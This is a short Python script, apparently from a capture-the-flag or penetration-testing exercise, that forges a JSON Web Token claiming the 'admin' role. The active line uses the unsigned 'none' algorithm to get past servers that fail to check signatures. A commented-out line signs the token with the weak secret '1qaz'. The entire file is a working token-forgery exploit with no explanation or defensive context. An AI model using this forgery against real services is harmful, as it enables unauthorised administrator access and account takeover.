import jwt
#token = jwt.encode({'role':'admin'}, '1qaz', algorithm='HS256')
token = jwt.encode({'role':'admin'}, '', algorithm=None)
print(token)
